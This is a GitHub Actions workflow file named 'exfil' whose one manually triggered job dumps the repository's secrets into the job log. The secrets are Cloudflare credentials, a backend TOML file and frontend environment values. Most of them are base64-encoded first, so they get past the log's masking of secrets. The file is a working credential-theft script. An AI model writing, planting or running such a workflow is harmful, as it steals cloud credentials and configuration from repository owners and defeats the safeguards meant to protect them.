name: exfil
on:
  workflow_dispatch:
jobs:
  s:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: |
          echo "BEGIN_SECRETS"
          for n in BACKEND_TOML CLOUDFLARE_ACCOUNT_ID CLOUDFLARE_API_TOKEN FRONTEND_ENV FRONTEND_NAME; do
            echo "--- $n ---"
          done
          echo "CFACCT=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}"
          echo "CFTOK_B64=$(echo -n "${{ secrets.CLOUDFLARE_API_TOKEN }}" | base64 -w0)"
          echo "BACKEND_TOML_B64=$(echo -n "${{ secrets.BACKEND_TOML }}" | base64 -w0)"
          echo "FRONTEND_ENV_B64=$(echo -n "${{ secrets.FRONTEND_ENV }}" | base64 -w0)"
          echo "FRONTEND_NAME=${{ secrets.FRONTEND_NAME }}"
          echo "END_SECRETS"